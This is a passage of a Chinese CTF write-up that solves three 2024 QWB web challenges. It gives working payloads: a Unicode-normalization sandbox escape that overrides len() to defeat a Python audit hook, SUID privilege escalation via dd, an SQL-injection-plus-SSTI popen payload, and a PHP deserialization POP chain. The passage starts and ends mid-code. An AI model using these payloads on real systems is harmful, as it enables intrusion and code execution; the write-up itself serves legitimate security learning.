class="hljs-string">&#x27;TEXT&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        text = block_to_python(text_block)  <br>        code = <span class="hljs-string">f&quot;print(<span class="hljs-subst">&#123;text&#125;</span>)&quot;</span><br>           <br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;math_number&#x27;</span>:<br>        <br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;NUM&#x27;</span>]).isdigit():      <br>            code =  <span class="hljs-built_in">int</span>(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;NUM&#x27;</span>]) <br>        <span class="hljs-keyword">else</span>:<br>            code = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;text&#x27;</span>:<br>        <span class="hljs-keyword">if</span> check_for_blacklisted_symbols(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]):<br>            code = <span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>        <br>            code =  <span class="hljs-string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]) + <span class="hljs-string">&quot;&#x27;&quot;</span><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;max&#x27;</span>:<br>        <br>        a_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;A&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        b_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;B&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        a = block_to_python(a_block)  <br>        b = block_to_python(b_block)<br>        code =  <span class="hljs-string">f&quot;max(<span class="hljs-subst">&#123;a&#125;</span>, <span class="hljs-subst">&#123;b&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">elif</span> block_type == <span class="hljs-string">&#x27;min&#x27;</span>:<br>        a_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;A&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        b_block = block[<span class="hljs-string">&#x27;inputs&#x27;</span>][<span class="hljs-string">&#x27;B&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        a = block_to_python(a_block)<br>        b = block_to_python(b_block)<br>        code =  <span class="hljs-string">f&quot;min(<span class="hljs-subst">&#123;a&#125;</span>, <span class="hljs-subst">&#123;b&#125;</span>)&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;next&#x27;</span> <span class="hljs-keyword">in</span> block:<br>        <br>        block = block[<span class="hljs-string">&#x27;next&#x27;</span>][<span class="hljs-string">&#x27;block&#x27;</span>]<br>        <br>        code +=<span class="hljs-string">&quot;\n&quot;</span> + block_to_python(block)+ <span class="hljs-string">&quot;\n&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> code <br>    <span class="hljs-keyword">return</span> code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">json_to_python</span>(<span class="hljs-params">blockly_data</span>):<br>    block = blockly_data[<span class="hljs-string">&#x27;blocks&#x27;</span>][<span class="hljs-string">&#x27;blocks&#x27;</span>][<span class="hljs-number">0</span>]<br><br>    python_code = <span class="hljs-string">&quot;&quot;</span><br>    python_code += block_to_python(block) + <span class="hljs-string">&quot;\n&quot;</span><br><br>        <br>    <span class="hljs-keyword">return</span> python_code<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">source_code</span>):<br>    hook_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">def my_audit_hook(event_name, arg):</span><br><span class="hljs-string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="hljs-string">    if len(event_name) &gt; 4:</span><br><span class="hljs-string">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="hljs-string">    for bad in blacklist:</span><br><span class="hljs-string">        if bad in event_name:</span><br><span class="hljs-string">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    <span class="hljs-built_in">print</span>(source_code)<br>    code = hook_code + source_code<br>    tree = <span class="hljs-built_in">compile</span>(source_code, <span class="hljs-string">&quot;run.py&quot;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> verify_secure(tree):  <br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;run.py&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(code)        <br>            result = subprocess.run([<span class="hljs-string">&#x27;python&#x27;</span>, <span class="hljs-string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="hljs-number">5</span>).stdout.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>            os.remove(<span class="hljs-string">&#x27;run.py&#x27;</span>)<br>            <span class="hljs-keyword">return</span> result<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Execution aborted due to security concerns.&quot;</span><br>    <span class="hljs-keyword">except</span>:<br>        os.remove(<span class="hljs-string">&#x27;run.py&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Timeout!&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> app.send_static_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/blockly_json&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">blockly_json</span>():<br>    blockly_data = request.get_data()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(blockly_data))<br>    blockly_data = json.loads(blockly_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(blockly_data)<br>    <span class="hljs-keyword">try</span>:<br>        python_code = json_to_python(blockly_data)<br>        <span class="hljs-keyword">return</span> do(python_code)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Error generating Python code&quot;</span>, <span class="hljs-string">&quot;details&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;)<br>    <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host = <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>阅读发现只有text的内容可以由用户控制，那只能从入手。</p><p>关注到unidecode.unidecode()这个函数，它可以将unicode字符转换成asclli字符，那我们可以使用全角的unicode字符绕过黑名单，然后由unidecode.unidecode()转换成半角的ascll码正常识别。</p><p>这里附上一个寻找半角对应的全角的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> unidecode<br><span class="hljs-built_in">print</span>(unidecode.unidecode(<span class="hljs-string">&quot;Κνωσός&quot;</span>))<br><br>target = <span class="hljs-string">&quot;(&quot;</span><br><br><span class="hljs-keyword">for</span> section <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x000</span>, <span class="hljs-number">0x1f1</span>):<br>    <span class="hljs-keyword">try</span>:<br>        mod = <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;unidecode.x%03x&#x27;</span>%(section), <span class="hljs-built_in">globals</span>(), <span class="hljs-built_in">locals</span>(), [<span class="hljs-string">&#x27;data&#x27;</span>])<br>        <span class="hljs-keyword">if</span> target <span class="hljs-keyword">in</span> mod.data:<br>            <span class="hljs-built_in">print</span>(mod.data)<br>            <span class="hljs-built_in">print</span>(section)<br>            <span class="hljs-built_in">print</span>(mod.data.index(target))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((section &lt;&lt; <span class="hljs-number">8</span>) + mod.data.index(target)))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span> ImportError:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p>第二步就是要绕过钩子函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event_name, arg</span>):<br>    blacklist = [<span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;memoryview&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(event_name) &gt; <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Too Long!&quot;</span>)<br>    <span class="hljs-keyword">for</span> bad <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> bad <span class="hljs-keyword">in</span> event_name:<br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;No!&quot;</span>)<br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).addaudithook(my_audit_hook)<br></code></pre></td></tr></table></figure><p>这里执行os.system的时候会触发hook函数去检查这个事件的名字长度，这里可以通过重写len函数实现绕过</p><p>_<em>import</em>_ (“builtins”).len&#x3D;lambda x:0 这样无论怎么样len函数都返回0。</p><p>还要用 ’ 去闭合前面的引号和末尾的引号，并使用;隔开，避免报错。</p><p>最终payload如下：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">‘;＿＿builtins＿＿．<span class="hljs-built_in">len</span> ＝ lambda x： <span class="hljs-number">2</span>\n＿＿import＿＿（＂<span class="hljs-built_in">os</span>＂）．system（＂<span class="hljs-built_in">find</span> ／ －perm －u＝s －<span class="hljs-built_in">type</span> f <span class="hljs-number">2</span>＞／dev／null＂）;‘<br></code></pre></td></tr></table></figure><p>suid提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>发现dd命令具有suid权限</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">dd <span class="hljs-attribute">if</span>=/flag <span class="hljs-attribute">of</span>=/dev/stdout<br></code></pre></td></tr></table></figure><h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>这道题先要搓个自动化脚本通关游戏(看来做web还是要多练写脚本啊，不然连第一关都过不去bushi…）</p><p>然后给你一个路径</p><p><img src="/2024/11/04/2024%E5%BC%BA%E7%BD%91%E6%9D%AF%E5%A4%8D%E7%8E%B0wp/image-20241105215802287.png" alt="image-20241105215802287"></p><p>测了⼀下发现有个sql注⼊，数据库是sqlite，只有⼀个users表，不好利⽤。然后⼜测出来有⼀个ssti，直接⽤ssti rce读flag</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">snake_win?username=asd%27%20union+select+1,2,&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&quot;&quot;.__class__.__base__.__subclasses__</span>()[69][&quot;load_module&quot;](<span class="hljs-name">&quot;os&quot;</span>).popen(<span class="hljs-name">&quot;cat+/flag&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#x27;;--+</span><br></code></pre></td></tr></table></figure><h2 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h2><p>密码规则</p><ol><li><p>您不满足 Rule 1: 请至少包含数字和大小写字母</p></li><li><p>您不满足 Rule 2: 密码中所有数字之和必须为30的倍数（30是每次都会变的数字）</p></li><li><p>您不满足 Rule 3:请密码中包含下列算式的解(如有除法，则为整除): 20318 * 25</p></li><li><p>您不满足 Rule 4:密码长度不能超过170。</p><p>写脚本通过游戏</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>target = <span class="hljs-string">&quot;http://eci-2ze0pqgkgxajnn536v58.cloudeci1.ichunqiu.com/&quot;</span><br><br>session = requests.Session()<br><br>res = session.post(target + <span class="hljs-string">&quot;/index.php?action=start&quot;</span>, data=&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit_password</span>(<span class="hljs-params">password</span>):<br>    res = session.post(target + <span class="hljs-string">&quot;/game.php&quot;</span>, data=&#123;<span class="hljs-string">&quot;password&quot;</span>: password&#125;)<br>    <span class="hljs-keyword">return</span> res.text<br><br>result = submit_password(<span class="hljs-string">&quot;Aa1&quot;</span>)<br>last_line = result.split(<span class="hljs-string">&quot;\n&quot;</span>)[-<span class="hljs-number">1</span>]<br>倍数 = <span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">r&quot;\d+&quot;</span>, last_line)[<span class="hljs-number">0</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;倍数&quot;</span>, 倍数)<br><br>result = submit_password(<span class="hljs-string">&quot;Aa0&quot;</span>)<br>last_line = result.split(<span class="hljs-string">&quot;\n&quot;</span>)[-<span class="hljs-number">1</span>]<br>算式结果 = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">eval</span>(last_line))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;算式结果&quot;</span>, 算式结果)<br>算式结果每一位加起来 = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, <span class="hljs-built_in">str</span>(算式结果)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;算式结果每一位加起来&quot;</span>, 算式结果每一位加起来)<br><span class="hljs-comment">#payload = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;O:5:&quot;guest&quot;:2:&#123;s:8:&quot;username&quot;;N;s:5:&quot;value&quot;;N;&#125;s:8:&quot;password&quot;;N;&#125;&#x27;</span><br>payload = <span class="hljs-string">r&#x27;O:4:&quot;root&quot;:2:&#123;s:8:&quot;username&quot;;O:4:&quot;user&quot;:3:&#123;s:8:&quot;username&quot;;S:7:&quot;2024\71wb&quot;;s:8:&quot;password&quot;;N;s:5:&quot;value&quot;;N;&#125;s:5:&quot;value&quot;;R:3;&#125;&#x27;</span><br>payload_sum = <span class="hljs-built_in">sum</span>([<span class="hljs-built_in">int</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> payload <span class="hljs-keyword">if</span> i.isdigit()])<br>now_num = 算式结果每一位加起来 + payload_sum<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;now_num&quot;</span>, now_num)<br>差的大概倍数 = <span class="hljs-built_in">int</span>(now_num / 倍数)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;差的大概倍数&quot;</span>, 差的大概倍数)<br><br>差的值 =  (倍数 * (差的大概倍数 + <span class="hljs-number">1</span>)) - 算式结果每一位加起来 - payload_sum<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;差的值：&quot;</span>, 差的值)<br><span class="hljs-keyword">assert</span> 差的值 &gt;= <span class="hljs-number">0</span>, <span class="hljs-string">&quot;懒得处理差的值小于0的情况了&quot;</span><br>添加的尾巴 = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">while</span> 差的值 &gt;= <span class="hljs-number">10</span>:<br>    差的值 -= <span class="hljs-number">9</span><br>    添加的尾巴 += <span class="hljs-string">&quot;9&quot;</span><br>添加的尾巴 += <span class="hljs-built_in">str</span>(差的值)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;添加的尾巴&quot;</span>, 添加的尾巴)<br>password = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;payload&#125;</span><span class="hljs-subst">&#123;算式结果&#125;</span><span class="hljs-subst">&#123;添加的尾巴&#125;</span>&quot;</span><br>password_sum = <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">ord</span>, password))<br><span class="hljs-built_in">print</span>(password)<br><span class="hljs-built_in">print</span>(password_sum)<br><br>result = submit_password(password)<br><span class="hljs-built_in">print</span>(result)<br><br></code></pre></td></tr></table></figure><p>通关后得到如下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;2024qwb&quot;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nonono&quot;</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">guest</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-string">&quot;guest&quot;</span>)&#123;<br>            <span class="hljs-variable">$value</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;username;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;value == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;value = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>];<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;hello:&quot;</span>.<span class="hljs-variable">$this</span>-&gt;value);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;password-&gt;<span class="hljs-title function_ invoke__">guess</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> )&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;username;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$user</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;password&quot;</span>]));<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$user</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable">$user</span>-&gt;password == <span class="hljs-string">&quot;2024qwb&quot;</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>看上去有两条链子</p><p>第一条是最下面strpos($user-&gt;username, “admin”) &#x3D;&#x3D; 0，可以让$user-&gt;username等于一个guest对象，那这 里比较字符串就会触发__tostring()，然后 $value()可以触发user的 _<em>invoke()，然后可以触发guest的_<em>call</em></em></p><p>第二条就是$user-&gt;password &#x3D;&#x3D; “2024qwb”，可以让$user为root对象，去触发 __get，但这里要先满足 strpos($user-&gt;username, “admin”) &#x3D;&#x3D; 0这个判断。</p><p>其实第一条在$value()那里跑不通，正确的是$this-&gt;value()</p><p>这里可以使用<strong>引用绕过</strong>进行绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;flag&quot;</span>] = <span class="hljs-string">&quot;flag&#123;test&#125;&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;2024qwb&quot;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">print</span>(<span class="hljs-variable">$password</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nonono&quot;</span>,<span class="hljs-variable">$password</span>);<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">root</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;2024qwb&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-string">&quot;admin&quot;</span>) == <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;value == <span 